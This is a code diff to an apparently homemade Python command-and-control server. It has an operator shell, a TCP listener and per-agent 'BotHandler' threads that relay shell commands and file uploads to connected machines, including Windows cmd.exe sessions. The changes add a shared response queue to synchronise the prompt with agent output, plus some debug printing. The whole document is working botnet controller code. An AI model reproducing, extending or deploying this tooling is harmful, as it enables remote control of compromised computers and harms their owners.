@@ -26,12 +26,13 @@ import inspect
 
 
 def main():
-    terminal = Terminal(Listeners,ClientDict)
+    responseq = queue.Queue()
+    terminal = Terminal(Listeners,ClientDict,responseq)
     terminal.cmdloop()
 
 
 class Terminal(Cmd):
-    def __init__(self,Listeners,ClientDict):
+    def __init__(self,Listeners,ClientDict,RespQueue):
         Cmd.__init__(self)
         self.lport = 8008
         self.lhost = "0.0.0.0"
@@ -43,6 +44,7 @@ class Terminal(Cmd):
         self.parentagent = None
         self.prompt = '$ '
         self.tokill = ''
+        self.rq = RespQueue
 
     def help_interact(self):
         print("interact <agent_id>")
@@ -83,10 +85,20 @@ class Terminal(Cmd):
             self.parentagent = self.agent
             self.agent = list(self.ClientDict.keys())[-1]
             
-            # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
-            
+
             self.do_interact(self.agent)
             self.shellip = self.ClientDict[self.agent][0][0]
+
+            # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
+            print("[DBG]")
+            print(self.ClientDict)
+            print("ParentIP: {}".format( self.ClientDict[self.parentagent][0][0]))
+            print("ShellIP: {}".format(self.ClientDict[self.agent][0][0]))
+            if self.ClientDict[self.agent][0][0] ==  self.ClientDict[self.parentagent][0][0]:
+                print("IP match")
+            else:
+                print("Do Not match")
+            print("[END DBG]")
             self.prompt = '{} shell $ '.format(self.shellip)
             
             # After Queue is assigned and IP parsed, can
@@ -162,7 +174,7 @@ class Terminal(Cmd):
                 if value.lower() == "tcp":
                     for i in range(len(self.listeners)):
                         if 'tcp' in self.listeners[i][0]:
-                            tcp_listener = self.listeners[i][1](self.lhost,self.lport)
+                            tcp_listener = self.listeners[i][1](self.lhost,self.lport,self.rq)
                             tcp_listener.start()
             else:
                 print("[-] No such start option.")
@@ -220,7 +232,11 @@ class Terminal(Cmd):
             pass
         else:
             self.q.put("\n")
-            time.sleep(1.4) # To not input prompt before response
+            # To not input prompt before response
+            while len(list(self.rq.queue)) > 1:
+                time.sleep(0.5)
+                print("[DBG]")
+                print(list(self.rq.queue))
     
     def default(self, args):
         if self.q == None:
@@ -228,15 +244,21 @@ class Terminal(Cmd):
             self.help_interact()
         else:
             self.q.put(args+"\n")
-            time.sleep(1.4) # To not input prompt before response
+            # To not input prompt before response
+            while len(list(self.rq.queue)) > 1:
+                time.sleep(0.5)
+                print("[DBG]")
+                print(list(self.rq.queue))
+
 
 
 
 class listener_tcp(threading.Thread):
-    def __init__(self, lhost, lport):
+    def __init__(self, lhost, lport, ResponseQueue):
         threading.Thread.__init__(self)
         self.lhost = lhost
         self.lport = lport
+        self.rq = ResponseQueue
 
     def run(self):
         server = socket.socket()
@@ -251,7 +273,7 @@ class listener_tcp(threading.Thread):
             q = queue.Queue()
             
             # Any agent connection goes in BotHandler threading class.
-            newthread = BotHandler(client, client_address, q)
+            newthread = BotHandler(client, client_address, q, self.rq)
             
             randName = hashlib.sha1(hex(random.randrange(100000,200000)).split('0x')[1].encode('utf-8')).hexdigest()
             newthread.setName(str(randName))
@@ -261,13 +283,14 @@ class listener_tcp(threading.Thread):
 
 
 class BotHandler(threading.Thread):
-    def __init__(self, client, client_address, myqueue):
+    def __init__(self, client, client_address, myqueue, ResponseQueue):
         threading.Thread.__init__(self)
         self.client = client
         self.client_address = client_address
         self.ip = client_address[0]
         self.port = client_address[1]
         self.q = myqueue
+        self.rq = ResponseQueue
     
     def run(self):
         # Handling client thread
@@ -303,27 +326,30 @@ class BotHandler(threading.Thread):
                 cmd_response = ""
                 while True:
                     try:
-                        # Client returns entered command (because cmd.exe has it in input)
-                        # So 
-                        # if response is only as large as input - command not completed yet
-                        #   .. wait longer timeout for command execution ..
-                        # else - some output already is received
-                        #   .. do not wait more if there's no data in socket.
+                        # long taking commands
                         if "upload" in RecvBotCmd:
                             self.client.settimeout(5)
+                        elif "ping" in RecvBotCmd:
+                            self.client.settimeout(5)
+                        # cmd.exe shell returns input
+                        # wait if response not longer than command
                         elif (len(cmd_response) <= len(RecvBotCmd)):
                             self.client.settimeout(5)
                         else:
                             self.client.settimeout(1)
                         recv = self.client.recv(4096).decode('utf-8')
+                        # Queue needed to tell terminal to wait before showing prompt
+                        self.rq.put(recv)
                     except socket.timeout:
                         # if timeout exception is triggered - assume no data anymore
                         recv = ""
                     except Exception as ex:
                         print("[-] Exception while getting response: {}".format(ex))
+                        self.rq.queue.clear()
                         break
                     
                     if not recv:
+                        self.rq.queue.clear()
                         break
                     else:
                         cmd_response += recv
@@ -335,6 +361,7 @@ class BotHandler(threading.Thread):
             
             except Exception as ex:
                 print("[-] Exception occured while sending command: {}".format(ex))
+                self.rq.queue.clear()
                 break
 
 
